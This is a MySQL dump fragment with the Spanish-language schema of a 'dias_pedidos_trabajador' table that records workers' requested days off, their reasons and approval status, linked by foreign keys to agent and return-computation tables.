--
-- Table structure for table `dias_pedidos_trabajador`
--

DROP TABLE IF EXISTS `dias_pedidos_trabajador`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dias_pedidos_trabajador` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `codigo_agente` int(11) NOT NULL,
  `fecha` date NOT NULL,
  `motivo` varchar(255) NOT NULL,
  `fecha_devolucion` date DEFAULT NULL,
  `motivo_devolucion` varchar(255) DEFAULT NULL,
  `debe` tinyint(1) NOT NULL DEFAULT 0,
  `respuesta` enum('PENDIENTE','ACEPTADO','RECHAZADO') NOT NULL DEFAULT 'PENDIENTE',
  `texto_respuesta` text DEFAULT NULL,
  `computo_devolucion_id` int(11) DEFAULT NULL,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `codigo_agente_2` (`codigo_agente`,`fecha`),
  KEY `codigo_agente` (`codigo_agente`),
  KEY `computo_devolucion_id` (`computo_devolucion_id`),
  CONSTRAINT `dias_pedidos_trabajador_ibfk_1` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `dias_pedidos_trabajador_ibfk_2` FOREIGN KEY (`computo_devolucion_id`) REFERENCES `computo_devoluciones` (`id`) ON DELETE SET NULL ON UPDATE NO ACTION
) ENGINE=InnoDB AUTO_INCREMENT=963 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

